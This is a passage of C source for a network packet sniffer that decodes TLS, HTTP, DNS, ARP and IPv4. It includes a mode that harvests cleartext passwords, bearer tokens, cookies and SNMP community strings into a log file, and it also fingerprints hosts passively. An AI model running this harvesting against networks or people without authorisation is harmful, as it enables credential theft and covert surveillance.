                    memcpy(p->tls_vers + used, vs, c);
                    used += c;
                    p->tls_vers[used] = 0;
                    q += 2;
                }
            }
        }
        pos += el;
    }
}

static void decode_tls(packet_t *p, const uint8_t *b, size_t n) {
    if (n < 5 || b[1] != 3 || b[0] < 20 || b[0] > 24) return;
    const char *ctn = tls_ct_name(b[0]);
    if (!ctn) return;
    size_t rl = rd16(b + 3);                    /* length field: bytes 3..4 */
    if (rl > 16384 + 2048) return;              /* sanity: max record + slop */

    p->app = APP_TLS;
    p->tls_ct = b[0];
    snprintf(p->tls_type, sizeof p->tls_type, "%s", ctn);
    char vb[16];
    snprintf(p->tls_ver, sizeof p->tls_ver, "%s", tls_ver_str(rd16(b + 1), vb, sizeof vb));

    size_t body = n - 5;
    if (rl < body) body = rl;
    const uint8_t *r = b + 5;

    if (b[0] == 22 && body >= 4) {
        uint8_t h = r[0];
        size_t hl = ((size_t)r[1] << 16) | ((size_t)r[2] << 8) | r[3];
        const char *hn = tls_hs_name(h);
        snprintf(p->tls_type, sizeof p->tls_type, "%s", hn ? hn : "handshake?");
        size_t hs = body - 4;
        if (hl < hs) hs = hl;
        const uint8_t *d = r + 4;
        if ((h == 1 || h == 2) && hs >= 35) {
            int is_sh = (h == 2);
            size_t pos = 2 + 32;                       /* legacy version + random */
            pos += 1 + d[pos];                         /* session id */
            if (!is_sh && pos + 2 <= hs) {
                size_t cs = rd16(d + pos);
                pos += 2 + cs;
                if (pos < hs) pos += 1 + d[pos];       /* compression methods */
                if (pos + 2 <= hs) {
                    size_t el = rd16(d + pos);
                    pos += 2;
                    size_t end = pos + el < hs ? pos + el : hs;
                    tls_exts(p, d, pos, end, 0);
                }
            } else if (is_sh && pos + 3 <= hs) {
                p->tls_cipher = rd16(d + pos);
                pos += 3;                              /* cipher + compression */
                if (pos + 2 <= hs) {
                    size_t el = rd16(d + pos);
                    pos += 2;
                    size_t end = pos + el < hs ? pos + el : hs;
                    tls_exts(p, d, pos, end, 1);
                }
            }
        }
        if (h == 1) {
            lsts(p->app_s, sizeof p->app_s, "ClientHello");
            if (p->tls_sni[0])   lsts(p->app_s, sizeof p->app_s, "SNI=%s", p->tls_sni);
            if (p->tls_alpn[0])  lsts(p->app_s, sizeof p->app_s, "ALPN=%s", p->tls_alpn);
            if (p->tls_vers[0])  lsts(p->app_s, sizeof p->app_s, "vers=%s", p->tls_vers);
        } else if (h == 2) {
            lsts(p->app_s, sizeof p->app_s, "ServerHello");
            lsts(p->app_s, sizeof p->app_s, "ver=%s", p->tls_ver);
            if (p->tls_cipher) {
                const char *cn = tls_cipher_name(p->tls_cipher);
                if (cn) lsts(p->app_s, sizeof p->app_s, "cipher=%s", cn);
                else lsts(p->app_s, sizeof p->app_s, "cipher=0x%04x", p->tls_cipher);
            }
        } else {
            lsts(p->app_s, sizeof p->app_s, "%s", p->tls_type);
        }
    } else if (b[0] == 21) {
        if (body >= 2) {
            const char *lvl = r[0] == 1 ? "fatal" : r[0] == 2 ? "warning" : "??";
            const char *dn = tls_alert_name(r[1]);
            char db[16];
            if (!dn) { snprintf(db, sizeof db, "code%u", r[1]); dn = db; }
            snprintf(p->app_s, sizeof p->app_s, "alert %s:%s", lvl, dn);
        } else snprintf(p->app_s, sizeof p->app_s, "alert (truncated)");
    } else if (b[0] == 23) {
        snprintf(p->app_s, sizeof p->app_s, "app-data %zu bytes", body);
    } else {
        snprintf(p->app_s, sizeof p->app_s, "%s", ctn);
    }
    if (!p->app_s[0]) snprintf(p->app_s, sizeof p->app_s, "%s", ctn);
}

/* --- HTTP/1.x --- */
static const char *http_methods[] = {
    "GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS", "PATCH", "TRACE", "CONNECT"
};

/* find "key: value" in a text buffer (line-oriented, case-insensitive) */
static int http_hdr(const uint8_t *b, size_t n, const char *key, char *out, size_t sz) {
    size_t klen = strlen(key);
    for (size_t i = 0; i + klen < n; i++) {
        if (i && b[i - 1] != '\n') continue;
        if (strncasecmp((const char *)b + i, key, klen) || b[i + klen] != ':') continue;
        size_t v = i + klen + 1;
        while (v < n && (b[v] == ' ' || b[v] == '\t')) v++;
        size_t e = v;
        while (e < n && b[e] != '\r' && b[e] != '\n') e++;
        size_t c = e - v;
        if (c >= sz) c = sz - 1;
        memcpy(out, b + v, c);
        out[c] = 0;
        return 1;
    }
    return 0;
}

static int looks_http(const uint8_t *b, size_t n) {
    if (n >= 9 && !memcmp(b, "HTTP/1.", 7) &&
        (b[7] == '0' || b[7] == '1') && b[8] == ' ') return 1;
    if (n >= 16 && !memcmp(b, "PRI * HTTP/2.0\r\n", 16)) return 1;
    for (size_t i = 0; i < sizeof http_methods / sizeof *http_methods; i++) {
        size_t m = strlen(http_methods[i]);
        if (n > m && b[m] == ' ' && !memcmp(b, http_methods[i], m)) return 1;
    }
    return 0;
}

static void decode_http(packet_t *p, const uint8_t *b, size_t n) {
    size_t lim = n < 4096 ? n : 4096;
    size_t e = 0;
    while (e < lim && b[e] != '\r' && b[e] != '\n') e++;
    size_t c = e < sizeof p->http_line ? e : sizeof p->http_line - 1;
    memcpy(p->http_line, b, c);
    p->http_line[c] = 0;
    p->app = APP_HTTP;

    if (n >= 16 && !memcmp(b, "PRI * HTTP/2.0\r\n", 16)) {
        snprintf(p->app_s, sizeof p->app_s, "HTTP/2 connection preface");
        return;
    }
    if (e >= 9 && !memcmp(b, "HTTP/", 5)) {          /* status line */
        const char *sp = strchr(p->http_line, ' ');
        p->http_code = sp ? atoi(sp + 1) : 0;
        snprintf(p->app_s, sizeof p->app_s, "%s", p->http_line);
        char cl[32];
        if (http_hdr(b, lim, "content-length", cl, sizeof cl))
            lsts(p->app_s, sizeof p->app_s, "len=%s", cl);
        char sv[80];
        if (http_hdr(b, lim, "server", sv, sizeof sv))
            lsts(p->app_s, sizeof p->app_s, "server=%s", sv);
        return;
    }
    /* request line */
    http_hdr(b, lim, "host", p->http_host, sizeof p->http_host);
    snprintf(p->app_s, sizeof p->app_s, "%s", p->http_line);
    if (p->http_host[0]) lsts(p->app_s, sizeof p->app_s, "host=%s", p->http_host);
}

/* decide which app decoder (if any) owns this payload */
static void decode_app(packet_t *p) {
    const uint8_t *b = p->payload;
    size_t n = p->avail;
    if (!b || !n || !(p->has_tcp || p->has_udp)) return;

    uint16_t sp = p->sport, dp = p->dport;
    if (sp == 53 || dp == 53 || sp == 5353 || dp == 5353 || sp == 5355 || dp == 5355) {
        if (n >= (p->has_tcp ? 14 : 12)) {
            decode_dns(p, b, n, p->has_tcp);
            if (p->app) return;
        }
    }
    if (p->has_tcp) {
        if (looks_http(b, n)) { decode_http(p, b, n); return; }
        if (n >= 5 && b[1] == 3 && b[0] >= 20 && b[0] <= 24) {
            decode_tls(p, b, n);
            if (p->app) return;
        }
        decode_banner(p, b, n);       /* -K: cleartext service banners */
    }
}

/* ---------- credential / token / banner harvesting (-K) ----------
 * All passive: we only read bytes that are already on the wire in cleartext
 * (or, for TLS, the metadata that is not encrypted - SNI, cert CN, ALPN).   */

static const char *b64_decode(const char *in, size_t inlen, uint8_t *out, size_t outsz) {
    static signed char tab[256];
    static int init = 0;
    if (!init) {
        for (int i = 0; i < 256; i++) tab[i] = -1;
        const char *al = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        for (int i = 0; i < 64; i++) tab[(unsigned char)al[i]] = (signed char)i;
        init = 1;
    }
    size_t o = 0;
    unsigned val = 0;
    int bits = 0;
    for (size_t i = 0; i < inlen; i++) {
        unsigned char c = (unsigned char)in[i];
        if (c == '=' ) break;
        if (c == '\n' || c == '\r') continue;
        int d = tab[c];
        if (d < 0) return NULL;
        val = (val << 6) | (unsigned)d;
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            if (o < outsz - 1) out[o++] = (uint8_t)((val >> bits) & 0xff);
        }
    }
    out[o] = 0;
    return (const char *)out;
}

static int printable_ratio(const uint8_t *b, size_t n) {
    if (!n) return 0;
    size_t ok = 0;
    for (size_t i = 0; i < n; i++)
        if ((b[i] >= 32 && b[i] < 127) || b[i] == '\t') ok++;
    return (int)(ok * 100 / n);
}

/* decode a JWT payload (middle segment) into a short readable summary */
static void jwt_summary(const char *tok, char *out, size_t sz) {
    const char *d1 = strchr(tok, '.');
    if (!d1) return;
    const char *d2 = strchr(d1 + 1, '.');
    if (!d2) return;
    uint8_t buf[1024];
    const char *j = b64_decode(d1 + 1, (size_t)(d2 - d1 - 1), buf, sizeof buf);
    if (!j) return;
    /* pull a few interesting claims without a real JSON parser */
    const char *keys[] = {"\"sub\"", "\"name\"", "\"email\"", "\"preferred_username\"",
                          "\"iss\"", "\"aud\"", "\"role\"", "\"scope\"", NULL};
    size_t w = 0;
    out[0] = 0;
    for (int i = 0; keys[i]; i++) {
        const char *k = strstr(j, keys[i]);
        if (!k) continue;
        const char *c = strchr(k, ':');
        if (!c) continue;
        c++;
        while (*c == ' ') c++;
        if (*c == '"') c++;
        const char *e = c;
        while (*e && *e != '"' && *e != ',' && *e != '}' && e - c < 60) e++;
        if (e == c) continue;
        w += (size_t)snprintf(out + w, sz > w ? sz - w : 0, "%.*s=%.*s ",
                              (int)(strlen(keys[i]) - 2), keys[i] + 1,
                              (int)(e - c > 50 ? 50 : e - c), c);
        if (w >= sz - 2) break;
    }
}

/* HTTP Basic auth: "Authorization: Basic <b64>" -> user:pass */
static void harvest_http_auth(packet_t *p, const uint8_t *b, size_t n) {
    char v[512];
    if (!http_hdr(b, n, "authorization", v, sizeof v)) return;
    if (!strncasecmp(v, "Basic ", 6)) {
        uint8_t dec[384];
        const char *s = b64_decode(v + 6, strlen(v + 6), dec, sizeof dec);
        if (s && strchr(s, ':') && printable_ratio(dec, strlen(s))) {
            const char *c = strchr(s, ':');
            size_t ul = (size_t)(c - s);
            if (ul >= sizeof p->cred_user) ul = sizeof p->cred_user - 1;
            memcpy(p->cred_user, s, ul); p->cred_user[ul] = 0;
            snprintf(p->cred_pass, sizeof p->cred_pass, "%s", c + 1);
            snprintf(p->cred_where, sizeof p->cred_where, "HTTP Basic");
            p->cred_kind = CRED_BASIC;
        }
    } else if (!strncasecmp(v, "Bearer ", 7)) {
        snprintf(p->token, sizeof p->token, "%s", v + 7);
        snprintf(p->cred_where, sizeof p->cred_where, "HTTP Bearer");
        p->cred_kind = CRED_BEARER;
        if (strchr(p->token, '.')) jwt_summary(p->token, p->jwt_sub, sizeof p->jwt_sub);
    }
}

/* cleartext form login: look for user=/username=/login= + pass=/password= */
static void harvest_http_form(packet_t *p, const uint8_t *b, size_t n) {
    if (n > 8192) n = 8192;
    /* strcasestr needs a NUL-terminated buffer; the frame slice is not one,
     * so scan a bounded copy (otherwise we read into stale frame bytes). */
    char body[8193];
    memcpy(body, b, n);
    body[n] = 0;
    const char *uk[] = {"username=", "user=", "login=", "email=", "uname=", NULL};
    const char *pk[] = {"password=", "passwd=", "pass=", "pwd=", NULL};
    char u[128] = "", pw[160] = "";
    for (int i = 0; uk[i] && !u[0]; i++) {
        const char *k = strcasestr(body, uk[i]);
        if (k) {
            const char *c = k + strlen(uk[i]);
            size_t w = 0;
            while (*c && *c != '&' && *c != '\n' && *c != '\r' && *c != ' ' &&
                   w < sizeof u - 1) {
                unsigned char ch = (unsigned char)*c;
                u[w++] = ch; c++;
            }
            u[w] = 0;
        }
    }
    for (int i = 0; pk[i] && !pw[0]; i++) {
        const char *k = strcasestr(body, pk[i]);
        if (k) {
            const char *c = k + strlen(pk[i]);
            size_t w = 0;
            while (*c && *c != '&' && *c != '\n' && *c != '\r' && *c != ' ' &&
                   w < sizeof pw - 1) {
                pw[w++] = (unsigned char)*c; c++;
            }
            pw[w] = 0;
        }
    }
    if (u[0] || pw[0]) {
        snprintf(p->cred_user, sizeof p->cred_user, "%s", u);
        snprintf(p->cred_pass, sizeof p->cred_pass, "%s", pw);
        snprintf(p->cred_where, sizeof p->cred_where, "HTTP form");
        p->cred_kind = CRED_FORM;
    }
}

/* generic "user: pass" / "LOGIN x" line grabber for cleartext protocols */
static void grab_pair(packet_t *p, const char *data, size_t n, const char *label,
                      const char *upfx, const char *ppfx, int kind) {
    if (!n) return;
    size_t lim = n < 4095 ? n : 4095;
    char buf[4096];
    memcpy(buf, data, lim); buf[lim] = 0;
    char *line = buf, *nl;
    char user[128] = "", pass[160] = "";
    while (line && *line) {
        nl = strpbrk(line, "\r\n");
        if (nl) *nl = 0;
        if (upfx && !user[0]) {
            char *k = strcasestr(line, upfx);
            if (k) { k += strlen(upfx);
                while (*k == ' ') k++;
                snprintf(user, sizeof user, "%s", k); }
        }
        if (ppfx && !pass[0]) {
            char *k = strcasestr(line, ppfx);
            if (k) { k += strlen(ppfx);
                while (*k == ' ') k++;
                snprintf(pass, sizeof pass, "%s", k); }
        }
        line = nl ? nl + 1 : NULL;
    }
    if (user[0] || pass[0]) {
        snprintf(p->cred_user, sizeof p->cred_user, "%s", user);
        snprintf(p->cred_pass, sizeof p->cred_pass, "%s", pass);
        snprintf(p->cred_where, sizeof p->cred_where, "%s", label);
        p->cred_kind = kind;
    }
}

/* Set-Cookie / Cookie -> session id */
static void harvest_cookie(packet_t *p, const uint8_t *b, size_t n) {
    char v[400];
    if (http_hdr(b, n, "set-cookie", v, sizeof v) ||
        http_hdr(b, n, "cookie", v, sizeof v)) {
        /* keep just the first name=value pair */
        char *semi = strchr(v, ';');
        if (semi) *semi = 0;
        snprintf(p->cookie, sizeof p->cookie, "%.*s",
                 (int)(sizeof p->cookie - 1), v);
    }
}

/* service banners: SSH / SMTP / FTP / POP3 / IMAP / MySQL / Telnet */
static void decode_banner(packet_t *p, const uint8_t *b, size_t n) {
    if (!n) return;
    uint16_t dp = p->dport, sp = p->sport;
    /* pick the well-known server port (either direction) */
    uint16_t port = dp;
    if (dp >= 1024 && sp < dp) port = sp;
    if (port == 22 || dp == 22) {
        if (n >= 4 && !memcmp(b, "SSH-", 4)) {
            size_t e = 0; while (e < n && b[e] != '\r' && b[e] != '\n' && e < 120) e++;
            snprintf(p->banner, sizeof p->banner, "%.*s", (int)e, b);
            snprintf(p->svc, sizeof p->svc, "ssh");
            st.banners++;
        }
        return;
    }
    if (port == 21 || port == 20 || dp == 21) {
        const char *s = (const char *)b;
        if (n >= 3 && !strncasecmp(s, "220", 3))
            { snprintf(p->banner, sizeof p->banner, "%.*s",
                       (int)(n < 100 ? n : 100), b);
              snprintf(p->svc, sizeof p->svc, "ftp"); st.banners++; }
        return;
    }
    if (port == 25 || port == 587 || dp == 25) {
        if (n >= 3 && !strncasecmp((const char *)b, "220", 3)) {
            size_t e = 0; while (e < n && b[e] != '\r' && b[e] != '\n' && e < 120) e++;
            snprintf(p->banner, sizeof p->banner, "%.*s", (int)e, b);
            snprintf(p->svc, sizeof p->svc, "smtp"); st.banners++;
        }
        return;
    }
    if (port == 110) {
        if (n >= 3 && !strncasecmp((const char *)b, "+OK", 3)) {
            size_t e = 0; while (e < n && b[e] != '\r' && b[e] != '\n' && e < 120) e++;
            snprintf(p->banner, sizeof p->banner, "%.*s", (int)e, b);
            snprintf(p->svc, sizeof p->svc, "pop3"); st.banners++;
        }
        return;
    }
    if (port == 143) {
        if (n >= 2 && !strncasecmp((const char *)b, "* OK", 4)) {
            size_t e = 0; while (e < n && b[e] != '\r' && b[e] != '\n' && e < 120) e++;
            snprintf(p->banner, sizeof p->banner, "%.*s", (int)e, b);
            snprintf(p->svc, sizeof p->svc, "imap"); st.banners++;
        }
        return;
    }
    if (port == 3306 && n >= 5) {
        /* MySQL handshake: 3-byte len, seq, protocol version 10 */
        if (b[3] == 10) {
            size_t o = 5, e = o;
            while (e < n && b[e]) e++;
            snprintf(p->banner, sizeof p->banner, "MySQL %.*s",
                     (int)(e - o > 60 ? 60 : e - o), b + o);
            snprintf(p->svc, sizeof p->svc, "mysql"); st.banners++;
        }
        return;
    }
    if (port == 23) {
        /* telnet negotiates with IAC(0xff); report the readable text after it */
        if (printable_ratio(b, n > 64 ? 64 : n) > 70) {
            size_t e = 0; while (e < n && b[e] >= 32 && b[e] < 127 && e < 80) e++;
            if (e >= 4) { snprintf(p->banner, sizeof p->banner, "%.*s", (int)e, b);
                          snprintf(p->svc, sizeof p->svc, "telnet"); st.banners++; }
        }
        return;
    }
}

/* append-only credential log shared by text/json/csv modes (-k <file>) */
static FILE *g_credfile;
static const char *cred_kind_name(int k);
static void credfile_close(void) {
    if (g_credfile) { fclose(g_credfile); g_credfile = NULL; }
}
static void credfile_write(const packet_t *p) {
    if (!cfg.credfile) return;
    if (!g_credfile) {
        g_credfile = fopen(cfg.credfile, "a");
        if (!g_credfile) { fprintf(stderr, "ch1m3ra: %s: %s\n", cfg.credfile, strerror(errno)); return; }
    }
    struct tm tm; localtime_r(&p->ts.tv_sec, &tm);
    char tb[32]; strftime(tb, sizeof tb, "%Y-%m-%d %H:%M:%S", &tm);
    if (p->cred_kind) {
        fprintf(g_credfile, "%s %s %s:%u -> %s:%u  [%s] user=%s pass=%s\n",
                tb, cred_kind_name(p->cred_kind), p->src_s, p->sport, p->dst_s, p->dport,
                p->cred_where, p->cred_user, p->cred_pass);
    } else if (p->token[0]) {
        fprintf(g_credfile, "%s token %s:%u -> %s:%u  %s%s%s\n", tb,
                p->src_s, p->sport, p->dst_s, p->dport, p->token,
                p->jwt_sub[0] ? "  " : "", p->jwt_sub);
    } else if (p->cookie[0]) {
        fprintf(g_credfile, "%s cookie %s:%u -> %s:%u  %s\n", tb,
                p->src_s, p->sport, p->dst_s, p->dport, p->cookie);
    }
    fflush(g_credfile);
}

/* human-readable name for a credential kind */
static const char *cred_kind_name(int k) {
    switch (k) {
        case CRED_BASIC:  return "basic";
        case CRED_BEARER: return "bearer";
        case CRED_FTP:    return "ftp";
        case CRED_POP3:   return "pop3";
        case CRED_IMAP:   return "imap";
        case CRED_SMTP:   return "smtp";
        case CRED_TELNET: return "telnet";
        case CRED_FORM:   return "form";
        case CRED_SNMP:   return "snmp";
        case CRED_COOKIE: return "cookie";
        default:          return "none";
    }
}

/* run all the -K harvesters on one packet's cleartext payload */
static void harvest(packet_t *p) {
    if (!cfg.harvest) return;
    const uint8_t *b = p->payload;
    size_t n = p->avail;
    if (!b || !n) return;

    if (p->app == APP_HTTP) {
        harvest_http_auth(p, b, n);
        if (!p->cred_kind) harvest_http_form(p, b, n);
        harvest_cookie(p, b, n);
    }
    if (p->has_tcp) {
        /* cleartext login protocols by port */
        if (p->dport == 21 || p->sport == 21)
            grab_pair(p, (const char *)b, n, "FTP", "USER ", "PASS ", CRED_FTP);
        else if (p->dport == 110 || p->sport == 110)
            grab_pair(p, (const char *)b, n, "POP3", "USER ", "PASS ", CRED_POP3);
        else if (p->dport == 143 || p->sport == 143)
            grab_pair(p, (const char *)b, n, "IMAP", "LOGIN ", "LOGIN ", CRED_IMAP);
        else if (p->dport == 25 || p->dport == 587)
            grab_pair(p, (const char *)b, n, "SMTP", "AUTH ", NULL, CRED_SMTP);
        else if (p->dport == 23 || p->sport == 23)
            grab_pair(p, (const char *)b, n, "Telnet", "login:", "Password:", CRED_TELNET);
    }
    if (p->has_udp && (p->dport == 161 || p->sport == 161)) {
        /* SNMPv1/v2c community string sits in cleartext in the request */
        if (n > 8) {
            size_t cl = b[n - 1];
            (void)cl;
            /* last-but-one element is the community; do a printable scan */
            for (size_t i = 6; i + 4 < n; i++) {
                if (b[i] == 0x04) {                  /* OCTET STRING tag */
                    size_t l = b[i + 1];
                    if (l >= 1 && l <= 32 && i + 2 + l <= n &&
                        printable_ratio(b + i + 2, l) == 100) {
                        snprintf(p->cred_user, sizeof p->cred_user, "community");
                        snprintf(p->cred_pass, sizeof p->cred_pass, "%.*s", (int)l, b + i + 2);
                        snprintf(p->cred_where, sizeof p->cred_where, "SNMP");
                        p->cred_kind = CRED_SNMP;
                        break;
                    }
                }
            }
        }
    }
    if (p->cred_kind) st.creds++;
    if (p->cred_kind || p->token[0] || p->cookie[0]) credfile_write(p);
}

/* ---------- reconnaissance: passive OS fingerprint / talkers / names ---------- */
#define NHOST 512

typedef struct {
    int      used;
    uint8_t  ip[16];
    int      fam;
    char     ip_s[INET6_ADDRSTRLEN];
    char     os[64];
    unsigned long long pkts, bytes, out_bytes;
    unsigned ttl;
    uint16_t mss;
    int      wscale;
    uint64_t t0_ms, t1_ms;
    char     name[128];        /* hostname learned from mDNS/LLMNR/NBNS/DNS */
} hostent_t;

static hostent_t htab[NHOST];
static unsigned hn = 0;

static hostent_t *host_find(const uint8_t *ip, int fam, int create, const char *ips) {
    for (unsigned i = 0; i < hn; i++)
        if (htab[i].used && htab[i].fam == fam && !memcmp(htab[i].ip, ip, 16))
            return &htab[i];
    if (!create || hn >= NHOST) return create && hn >= NHOST ? NULL : NULL;
    hostent_t *e = &htab[hn++];
    memset(e, 0, sizeof *e);
    e->used = 1;
    e->fam = fam;
    memcpy(e->ip, ip, 16);
    snprintf(e->ip_s, sizeof e->ip_s, "%s", ips);
    return e;
}

/* crude but useful p0f-style guess from TTL + TCP options */
static const char *os_from(uint8_t ttl, uint16_t mss, int wscale, uint16_t win) {
    int ttl_bucket = 0;
    if (ttl > 0 && ttl <= 64)  ttl_bucket = 64;
    else if (ttl <= 128)       ttl_bucket = 128;
    else                       ttl_bucket = 255;
    if (ttl_bucket == 64) {
        if (mss == 1460 && wscale == 7) return "Linux 5.x/6.x";
        if (mss == 1460)                return "Linux/Android";
        if (mss == 1440)                return "macOS/iOS";
        return "Unix-like";
    }
    if (ttl_bucket == 128) {
        if (mss == 1460 && wscale == 8) return "Windows 10/11";
        if (mss == 1460 && wscale == 2) return "Windows 7/8";
        if (mss == 1460)                return "Windows";
        return "Windows/other";
    }
    if (ttl_bucket == 255) {
        if (mss == 1460) return "network device (Cisco/embedded)";
        return "appliance";
    }
    (void)win;
    return NULL;
}

/* classify a TCP SYN's OS options, record per-host timing for RTT */
static void finger_observe(packet_t *p) {
    if (!cfg.finger || !p->ip_ver) return;
    char ips[INET6_ADDRSTRLEN];
    const char *src_s = p->src_s[0] ? p->src_s : (inet_ntop(
        p->ip_ver == 4 ? AF_INET : AF_INET6, p->src, ips, sizeof ips), ips);
    hostent_t *h = host_find(p->src, p->ip_ver, 1, src_s);
    if (!h) return;
    h->pkts++;
    h->bytes += p->caplen;
    if (p->have_dir && p->outgoing) h->out_bytes += p->caplen;
    uint64_t ms = (uint64_t)p->ts.tv_sec * 1000 + (uint64_t)(p->ts.tv_nsec / 1000000);
    if (!h->t0_ms) h->t0_ms = ms;
    h->t1_ms = ms;
    if (p->has_tcp) {
        h->ttl = p->ttl;
        /* extract MSS + window scale from the option string is lossy; parse raw */
        if (p->flags & 0x0002 && !h->mss) {
            /* options live in the TCP header; re-derive MSS/WS from opts_s */
            const char *m = strstr(p->opts_s, "MSS=");
            if (m) h->mss = (uint16_t)atoi(m + 4);
            const char *w = strstr(p->opts_s, "WS=");
            if (w) h->wscale = atoi(w + 3);
            const char *osg = os_from(p->ttl, h->mss, h->wscale, p->win);
            if (osg) snprintf(h->os, sizeof h->os, "%s", osg);
        }
    }
    const char *osg = h->os[0] ? h->os : os_from(p->ttl, h->mss, h->wscale, p->win);
    if (osg) snprintf(p->os_guess, sizeof p->os_guess, "%s", osg);
}

/* learn hostnames from mDNS/LLMNR/NBNS/DNS responses */
static void name_learn(packet_t *p) {
    if (!cfg.names || !p->ip_ver) return;
    if (p->app != APP_DNS || !p->dns_qr || !p->dns_name[0]) return;
    if (!p->dns_first[0]) return;
    /* dns_first is "<name> <type> <value>"; we want name -> A/AAAA value */
    char nm[192], tp[16], val[INET6_ADDRSTRLEN];
    if (sscanf(p->dns_first, "%191s %15s %45s", nm, tp, val) != 3) return;
    if (strcmp(tp, "A") && strcmp(tp, "AAAA")) return;
    uint8_t ip[16];
    int fam = !strcmp(tp, "A") ? 4 : 6;
    if (inet_pton(fam == 4 ? AF_INET : AF_INET6, val, ip) != 1) return;
    hostent_t *h = host_find(ip, fam, 1, val);
    if (h && !h->name[0]) {
        snprintf(h->name, sizeof h->name, "%.*s", (int)(sizeof h->name - 1), nm);
        st.names++;
    }
}

/* top-talkers / connection matrix: per-host + per-conversation byte counts */
#define NCONV 1024
typedef struct {
    int used;
    char a[80], b[80];
    unsigned long long pkts, bytes;
} conv_t;
static conv_t ctab[NCONV];
static unsigned cn = 0;

static void talkers_observe(const packet_t *p) {
    if (!cfg.talkers || !p->ip_ver) return;
    char ab[80], bb[80];
    if (p->has_tcp || p->has_udp) {
        if (p->ip_ver == 6)
            snprintf(ab, sizeof ab, "[%s]:%u", p->src_s, p->sport);
        else
            snprintf(ab, sizeof ab, "%s:%u", p->src_s, p->sport);
        if (p->ip_ver == 6)
            snprintf(bb, sizeof bb, "[%s]:%u", p->dst_s, p->dport);
        else
            snprintf(bb, sizeof bb, "%s:%u", p->dst_s, p->dport);
    } else {
        snprintf(ab, sizeof ab, "%s", p->src_s);
        snprintf(bb, sizeof bb, "%s", p->dst_s);
    }
    for (unsigned i = 0; i < cn; i++) {
        conv_t *c = &ctab[i];
        if ((!strcmp(c->a, ab) && !strcmp(c->b, bb)) ||
            (!strcmp(c->a, bb) && !strcmp(c->b, ab))) {
            c->pkts++; c->bytes += p->caplen; return;
        }
    }
    if (cn >= NCONV) return;
    conv_t *c = &ctab[cn++];
    c->used = 1;
    snprintf(c->a, sizeof c->a, "%s", ab);
    snprintf(c->b, sizeof c->b, "%s", bb);
    c->pkts = 1; c->bytes = p->caplen;
}

static int conv_cmp(const void *x, const void *y) {
    const conv_t *a = x, *b = y;
    if (a->bytes < b->bytes) return 1;
    if (a->bytes > b->bytes) return -1;
    return 0;
}

static void talkers_stats(FILE *o) {
    if (!cfg.talkers || !cn) return;
    conv_t *v = malloc(cn * sizeof *v);
    if (!v) return;
    unsigned m = 0;
    for (unsigned i = 0; i < cn; i++) if (ctab[i].used) v[m++] = ctab[i];
    qsort(v, m, sizeof *v, conv_cmp);
    fprintf(o, "  top conversations (by bytes)\n");
    for (unsigned i = 0; i < m && i < 16; i++)
        fprintf(o, "    %-34s <-> %-34s %llu B  %llup\n",
                v[i].a, v[i].b, v[i].bytes, v[i].pkts);
    free(v);
}

static int host_cmp(const void *x, const void *y) {
    const hostent_t *a = x, *b = y;
    if (a->bytes < b->bytes) return 1;
    if (a->bytes > b->bytes) return -1;
    return 0;
}

static void finger_stats(FILE *o) {
    if (!cfg.finger || !hn) return;
    hostent_t *v = malloc(hn * sizeof *v);
    if (!v) return;
    unsigned m = 0;
    for (unsigned i = 0; i < hn; i++) if (htab[i].used) v[m++] = htab[i];
    qsort(v, m, sizeof *v, host_cmp);
    fprintf(o, "  hosts (passive OS fingerprint)\n");
    for (unsigned i = 0; i < m && i < 24; i++) {
        hostent_t *h = &v[i];
        double dur = (h->t1_ms > h->t0_ms) ? (double)(h->t1_ms - h->t0_ms) / 1000.0 : 0;
        fprintf(o, "    %-30s ttl=%-3u %-28s %llu B  %llup  %.2fs%s%s\n",
                h->ip_s, h->ttl, h->os[0] ? h->os : "-",
                h->bytes, h->pkts, dur,
                h->name[0] ? "  name=" : "", h->name);
    }
    free(v);
}

static void names_stats(FILE *o) {
    if (!cfg.names || !hn) return;
    int any = 0;
    for (unsigned i = 0; i < hn && !any; i++) if (htab[i].used && htab[i].name[0]) any = 1;
    if (!any) return;
    fprintf(o, "  names learned\n");
    for (unsigned i = 0; i < hn; i++)
        if (htab[i].used && htab[i].name[0])
            fprintf(o, "    %-40s %s\n", htab[i].name, htab[i].ip_s);
}

static void recon_cleanup(void) { }   /* tables are static, nothing to free */

static void decode_arp(packet_t *p, const uint8_t *b, size_t len) {
    snprintf(p->disp, sizeof p->disp, "ARP");
    snprintf(p->primary, sizeof p->primary, "arp");
    p->has_arp = 1;
    if (len < 8) { p->err = "truncated ARP"; p->malformed = 1; return; }
    p->arp_htype = rd16(b); p->arp_ptype = rd16(b + 2);
    uint8_t hlen = b[4], plen = b[5];
    p->arp_op = rd16(b + 6);
    if (p->arp_htype == 1 && p->arp_ptype == 0x0800 && hlen == 6 && plen == 4) {
        if (len < 28) { p->err = "truncated ARP body"; p->malformed = 1; return; }
        memcpy(p->arp_sha, b + 8, 6);
        inet_ntop(AF_INET, b + 14, p->arp_spa, sizeof p->arp_spa);
        memcpy(p->arp_tha, b + 18, 6);
        inet_ntop(AF_INET, b + 24, p->arp_tpa, sizeof p->arp_tpa);
        p->arp_ok = 1;
    } else {
        p->err = "non-Ethernet/IPv4 ARP variant";
    }
    /* ARP body fully displayed, skip payload dump of padding */
}

static void decode_ipv4(packet_t *p, const uint8_t *b, size_t len) {
    if (len < 20) { p->err = "runt IPv4"; p->malformed = 1; return; }
    if ((b[0] >> 4) != 4) { p->err = "bad IPv4 version"; p->malformed = 1; return; }
    size_t ihl = (size_t)(b[0] & 0xf) * 4;
    if (ihl < 20) { p->err = "bad IPv4 IHL"; p->malformed = 1; return; }
    if (len < ihl) { p->err = "truncated IPv4 header"; p->malformed = 1; return; }

    p->ip_ver = 4;
    uint16_t tot = rd16(b + 2);
    p->ip_id = rd16(b + 4);
    uint16_t fr = rd16(b + 6);
    p->df = (fr >> 14) & 1;
    p->mf = (fr >> 13) & 1;
    p->frag_off = (fr & 0x1fff) * 8;
    p->ttl = b[8];
    uint8_t nh = b[9];
    p->ip_csum = ck_ok_incl(b, ihl) ? 1 : 0;
    memcpy(p->src, b + 12, 4);
    memcpy(p->dst, b + 16, 4);
    inet_ntop(AF_INET, p->src, p->src_s, sizeof p->src_s);
    inet_ntop(AF_INET, p->dst, p->dst_s, sizeof p->dst_s);

    size_t avail = len - ihl;
    size_t l4len = 0;
    if (tot == 0) l4len = 0;                    /* offloaded/unknown, use capture */
